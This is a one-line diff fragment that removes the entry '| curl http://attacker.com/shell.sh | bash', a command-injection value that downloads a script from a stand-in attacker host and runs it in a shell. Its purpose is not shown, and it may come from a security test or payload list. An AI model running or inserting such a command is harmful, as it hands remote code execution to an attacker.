@@ -1,1 +1,0 @@
-| curl http://attacker.com/shell.sh | bash
